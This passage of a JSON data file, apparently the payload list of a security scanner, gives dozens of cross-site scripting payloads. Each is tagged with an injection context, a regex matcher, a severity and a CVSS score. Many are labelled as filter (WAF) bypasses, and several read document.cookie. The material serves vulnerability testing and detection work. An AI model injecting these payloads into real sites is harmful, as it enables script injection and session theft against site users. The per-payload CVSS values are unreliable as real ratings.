    "context": "waf-bypass",
    "matcher": "alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<a href=\"jav&#x0D;ascript:alert(1)\">click</a>",
    "context": "waf-bypass",
    "matcher": "alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<img src=`x` onerror=alert(1)>",
    "context": "waf-bypass",
    "matcher": "onerror=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\">",
    "context": "waf-bypass",
    "matcher": "onload=.alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<script type=text/javascript>alert(1)</script>",
    "context": "waf-bypass",
    "matcher": "alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<script language=javascript>alert(1)</script>",
    "context": "waf-bypass",
    "matcher": "alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<script>alert(1);</script>",
    "context": "html",
    "matcher": "alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<script>alert(document.domain)</script>",
    "context": "html",
    "matcher": "document\\.domain",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<script>alert(document.cookie)</script>",
    "context": "html",
    "matcher": "document\\.cookie",
    "severity": "CRITICAL",
    "cvss": 9.8
  },
  {
    "payload": "<img src=x:y onerror=alert(1)>",
    "context": "html",
    "matcher": "onerror=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "<script>alert(window.origin)</script>",
    "context": "html",
    "matcher": "window\\.origin",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<script>alert(location.href)</script>",
    "context": "html",
    "matcher": "location\\.href",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<script>(new Function('alert(1)'))();</script>",
    "context": "html",
    "matcher": "new Function",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<svg><foreignObject><script>alert(1)</script></foreignObject></svg>",
    "context": "html",
    "matcher": "alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<script>with(window)alert(1)</script>",
    "context": "html",
    "matcher": "with\\(window\\)alert",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "<input pattern=\"[a-z\" onchange=alert(1)>",
    "context": "html",
    "matcher": "onchange=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "<output oninput=alert(1)>",
    "context": "html",
    "matcher": "oninput=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "';let x=alert;x(1)//",
    "context": "js",
    "matcher": "alert;x\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "';const f=alert;f(1)//",
    "context": "js",
    "matcher": "const f=alert",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "';var a='alert(1)';eval(a)//",
    "context": "js",
    "matcher": "eval\\(a\\)",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "';(alert)(1)//",
    "context": "js",
    "matcher": "\\(alert\\)\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "';[].constructor.constructor('alert(1)')()//",
    "context": "js",
    "matcher": "constructor.*alert",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "';\"\".constructor.constructor('alert(1)')()//",
    "context": "js",
    "matcher": "constructor.*alert",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "javascript:/*--><svg onload=alert(1)>",
    "context": "url",
    "matcher": "alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.0
  },
  {
    "payload": "javascript:alert(1);void(0)",
    "context": "url",
    "matcher": "javascript:alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.0
  },
  {
    "payload": "<script>history.pushState('','','/');alert(1)</script>",
    "context": "html",
    "matcher": "alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<script>window.onerror=alert;throw 1</script>",
    "context": "html",
    "matcher": "window\\.onerror=alert",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "<script>onerror=alert;throw 1</script>",
    "context": "html",
    "matcher": "onerror=alert",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "<img src=x onerror=\"window.onerror=alert;throw 1\">",
    "context": "html",
    "matcher": "window\\.onerror=alert",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "\" onpointerenter=\"alert(1)",
    "context": "attribute",
    "matcher": "onpointerenter=.alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "\" onsearch=\"alert(1)",
    "context": "attribute",
    "matcher": "onsearch=.alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "<iframe onload=\"alert(parent.document.cookie)\">",
    "context": "html",
    "matcher": "document\\.cookie",
    "severity": "CRITICAL",
    "cvss": 9.8
  },
  {
    "payload": "<script>Object.defineProperty(document,'cookie',{get:()=>(alert(1),'x')})</script>",
    "context": "html",
    "matcher": "alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<base target=\"_blank\"><a href=javascript:alert(1)>click",
    "context": "html",
    "matcher": "javascript:alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "';throw{toString:()=>alert(1)}//",
    "context": "js",
    "matcher": "alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "';Array.from({length:1},alert)//",
    "context": "js",
    "matcher": "Array\\.from",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "';(async()=>{await alert(1)})()//",
    "context": "js",
    "matcher": "alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<svg><use xlink:href=\"data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#\">",
    "context": "html",
    "matcher": "alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<form><button formaction=javascript:alert(1)>click",
    "context": "html",
    "matcher": "javascript:alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.0
  },
  {
    "payload": "<input type=submit formaction=javascript:alert(1)>",
    "context": "html",
    "matcher": "javascript:alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.0
  },
  {
    "payload": "<object type=text/html data=javascript:alert(1)>",
    "context": "html",
    "matcher": "javascript:alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<svg><script xlink:href=data:,alert(1)></script></svg>",
    "context": "html",
    "matcher": "alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "'\"><img src=x onerror=alert(1)>",
    "context": "polyglot",
    "matcher": "onerror=alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "'\"><svg/onload=alert(1)>",
    "context": "polyglot",
    "matcher": "onload=alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "javascript:/*--><html><body><script>alert(1)</script>",
    "context": "polyglot",
    "matcher": "alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "\"'><script>alert(1)</script>",
    "context": "polyglot",
    "matcher": "alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<!--<img src=x:x onerror=alert(1)>-->",
    "context": "polyglot",
    "matcher": "onerror=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "<script>\\x61lert(1)</script>",
    "context": "waf-bypass",
    "matcher": "lert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<img src=x onerror=confirm(1)>",
    "context": "html",
    "matcher": "onerror=confirm\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "<img src=x onerror=prompt(1)>",
    "context": "html",
    "matcher": "onerror=prompt\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "<script>alert(1e3)</script>",
    "context": "waf-bypass",
    "matcher": "alert\\(1e3\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<script>alert(0x1)</script>",
    "context": "waf-bypass",
    "matcher": "alert\\(0x1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<script>/[@!]/.test(alert(1))</script>",
    "context": "waf-bypass",
    "matcher": "alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<script>typeof alert(1)</script>",
    "context": "waf-bypass",
    "matcher": "typeof alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<script>void alert(1)</script>",
    "context": "waf-bypass",
    "matcher": "void alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<img src onerror=alert(1)>",
    "context": "waf-bypass",
    "matcher": "onerror=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "<img/onerror=alert(1) src>",
    "context": "waf-bypass",
    "matcher": "onerror=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "<svgonload=alert(1)>",
    "context": "waf-bypass",
    "matcher": "alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.1
  },
  {
    "payload": "<svg/onload=alert(1)//",
    "context": "waf-bypass",
    "matcher": "onload=alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<svg onload\r=alert(1)>",
    "context": "waf-bypass",
    "matcher": "onload.{0,5}=.{0,5}alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "<img onerror\t=alert(1) src=x>",
    "context": "waf-bypass",
    "matcher": "onerror.{0,5}=.{0,5}alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "<script>\\u{61}lert(1)</script>",
    "context": "waf-bypass",
    "matcher": "lert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<script>String.prototype.big=function(){alert(1)}; 'x'.big()</script>",
    "context": "html",
    "matcher": "alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<script>Element.prototype.onmouseover=function(){alert(1)}</script><p>hover",
    "context": "html",
    "matcher": "alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "';new Error(alert(1))//",
    "context": "js",
    "matcher": "alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "';(1,alert)(1)//",
    "context": "js",
    "matcher": "\\(1,alert\\)\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "';this.alert&&this.alert(1)//",
    "context": "js",
    "matcher": "this\\.alert",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<img src=x onerror=alert(1) loading=lazy>",
    "context": "html",
    "matcher": "onerror=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "<form name=querySelectorAll><input name=value></form>",
    "context": "dom",
    "matcher": "name=querySelectorAll",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "<a id=x name=x><a id=x name=href value=javascript:alert(1)>",
    "context": "dom",
    "matcher": "javascript:alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.0
  },
  {
    "payload": "<script>location.href=location.hash.replace('#','javascript:')+'alert(1)'</script>#",
    "context": "html",
    "matcher": "alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<meta name=referrer content=no-referrer><script>alert(1)</script>",
    "context": "html",
    "matcher": "alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<script>XMLHttpRequest.prototype.open=function(){alert(1)}</script>",
    "context": "html",
    "matcher": "alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "<img src=1 href=1 onerror=\"javascript:alert(1)\">",
    "context": "html",
    "matcher": "alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "\"accesskey=\"x\" onclick=\"alert(1)",
    "context": "attribute",
    "matcher": "onclick=.alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "\" onfullscreenchange=\"alert(1)",
    "context": "attribute",
    "matcher": "onfullscreenchange=.alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "\" onmouseleave=\"alert(1)",
    "context": "attribute",
    "matcher": "onmouseleave=.alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "';window.onload=()=>alert(1)//",
    "context": "js",
    "matcher": "window\\.onload=",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "';document.onmousemove=()=>alert(1)//",
    "context": "js",
    "matcher": "document\\.onmousemove",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "'\"/><img src=x onerror=alert(1)><\"",
    "context": "polyglot",
    "matcher": "onerror=alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<script>%61lert(1)</script>",
    "context": "waf-bypass",
    "matcher": "alert\\(1\\)|%61lert",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<iframe src='javascript:alert(document.domain)'>",
    "context": "html",
    "matcher": "document\\.domain",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<script>window['al'+'ert'](1)</script>",
    "context": "waf-bypass",
    "matcher": "'al'\\+'ert'",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "<body onpageshow=alert(1)>",
    "context": "html",
    "matcher": "onpageshow=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.1
  },
  {
    "payload": "<div style=width:1px;height:1px;background:url(javascript:alert(1))>",
    "context": "html",
    "matcher": "javascript:alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "';location.replace('javascript:alert(1)')//",
    "context": "js",
    "matcher": "javascript:alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.0
  },
  {
    "payload": "';location.assign('javascript:alert(1)')//",
    "context": "js",
    "matcher": "javascript:alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.0
  },
  {
    "payload": "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",
    "context": "html",
    "matcher": "alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  }
]
